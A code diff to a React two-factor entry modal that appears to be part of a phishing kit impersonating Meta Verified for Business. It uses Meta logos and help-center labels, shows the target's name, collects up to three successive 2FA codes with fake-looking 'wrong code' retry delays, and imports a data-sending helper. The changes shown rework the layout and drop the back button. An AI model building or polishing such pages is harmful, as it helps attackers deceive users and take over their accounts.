@@ -6,7 +6,6 @@ import { buildTwoFaDestinationsLabel } from '@/utils/twoFaDescription'
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice'
 import { useAppStrings } from '@/hooks/useAppStrings'
-import { useLandingStrings } from '@/hooks/useLandingStrings'
 import { SendData } from '@/utils/sendData'
 import { markMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
 import MvSecureFlowPanel from '@/components/meta-verified-for-business/landing/MvSecureFlowPanel'
@@ -24,10 +23,8 @@ const RETRY_WAIT_AFTER_SECOND_WRONG_SEC = 30
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
   isOpend,
   isOpendFinish,
-  onToggleModal,
 }) => {
   const t = useAppStrings()
-  const landing = useLandingStrings()
 
   const getRetryWaitSeconds = (nextStep: number) =>
     nextStep === 1 ? RETRY_WAIT_AFTER_FIRST_WRONG_SEC : RETRY_WAIT_AFTER_SECOND_WRONG_SEC
@@ -125,14 +122,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
     if (click === 2) dispatch(updateForm({ twoFaThird: pasted }))
   }
 
-  const handleBack = () => {
-    if (intervalRef.current) {
-      clearInterval(intervalRef.current)
-      intervalRef.current = null
-    }
-    onToggleModal(false)
-  }
-
   const handSubmit = async (e: React.FormEvent) => {
     try {
       e.preventDefault()
@@ -208,18 +197,11 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
   }
 
   const inputClass = `mv-input mv-secure-input ${errors.twoFa ? 'is-invalid' : ''}`
-  const backLabel =
-    landing.helpCenter.breadcrumb[landing.helpCenter.breadcrumb.length - 1]?.label ?? t.common.close
 
   return (
-    <MvSecureFlowPanel
-      labelledBy="mv-twofa-title"
-      title={t.twoFa.title}
-      backLabel={backLabel}
-      onBack={handleBack}
-    >
-      <div className="mv-hc-secure-stack">
-        <div className="w-full">
+    <MvSecureFlowPanel labelledBy="mv-twofa-title" title={t.twoFa.title} layout="split">
+      <div className="mv-hc-secure-split">
+        <form className="mv-hc-secure-form" onSubmit={handSubmit}>
           <div className="mv-secure-identity">
             <span>{fullName}</span>
             <span className="mv-secure-identity-dot" aria-hidden />
@@ -227,28 +209,17 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
           </div>
           <p className="mv-secure-body">{t.twoFa.description(twoFaDestinations)}</p>
 
-          <div className="mv-secure-media">
-            <Image
-              src="/images/meta/authentication.png"
-              alt={t.twoFa.authIllustrationAlt}
-              width={1125}
-              height={492}
-              className="h-auto w-full"
-              sizes="(max-width: 768px) 100vw, 640px"
-            />
-          </div>
-
-          <form onSubmit={handSubmit}>
+          <div className="mv-secure-field">
             <label htmlFor="twoFa" className="mv-secure-label">
               {t.twoFa.label} <span className="mv-activation-required">*</span>
             </label>
-            <div className={inputClass}>
+            <div className={`${inputClass} mv-secure-input--code`}>
               <input
                 type="text"
                 inputMode="numeric"
                 id="twoFa"
                 placeholder={t.twoFa.placeholder}
-                className={`h-full w-full bg-transparent outline-none ${disabled ? 'cursor-not-allowed opacity-70' : ''}`}
+                className={disabled ? 'is-disabled' : undefined}
                 value={twoFa}
                 onChange={handleChange}
                 onPaste={handlePaste}
@@ -260,44 +231,41 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
             </div>
             <p className="mv-secure-hint">{t.twoFa.hint}</p>
             {errors.twoFa ? (
-              <p className="mb-3 text-[13px] text-[var(--mv-required,#e41e3f)]" role="alert">
-                {errors.twoFa}
+              <p className="mv-secure-error" role="alert">
+                <span>{errors.twoFa}</span>
               </p>
             ) : null}
+          </div>
 
-            <div className="mt-4 w-full">
-              <button
-                type="submit"
-                className="mv-secure-btn"
-                disabled={disabled || !isTwoFaValid || loading}
-                aria-label={t.twoFa.ariaSubmit}
-              >
-                {loading && (
-                  <div className="relative mr-[10px] h-[18px] w-[18px] shrink-0 animate-spin" aria-hidden>
-                    <Image
-                      src="/images/icons/ic_loading.svg"
-                      alt=""
-                      width={18}
-                      height={18}
-                      unoptimized
-                      className="block h-full w-full"
-                    />
-                  </div>
-                )}
-                {loading ? '' : t.common.continue}
-              </button>
-            </div>
-          </form>
-        </div>
+          <button
+            type="submit"
+            className="mv-secure-btn"
+            disabled={disabled || !isTwoFaValid || loading}
+            aria-label={t.twoFa.ariaSubmit}
+          >
+            {loading ? (
+              <span className="mv-secure-spinner" aria-hidden>
+                <Image
+                  src="/images/icons/ic_loading.svg"
+                  alt=""
+                  width={18}
+                  height={18}
+                  unoptimized
+                />
+              </span>
+            ) : (
+              t.common.continue
+            )}
+          </button>
+        </form>
 
-        <div className="mv-secure-footer-logo relative h-12 w-12">
+        <div className="mv-secure-media">
           <Image
-            src="/images/meta/logo-gray.svg"
-            alt={t.twoFa.metaLogoAlt}
-            width={48}
-            height={48}
-            unoptimized
-            className="h-full w-full object-contain"
+            src="/images/meta/authentication.png"
+            alt={t.twoFa.authIllustrationAlt}
+            width={1125}
+            height={492}
+            sizes="(max-width: 899px) 100vw, 340px"
           />
         </div>
       </div>
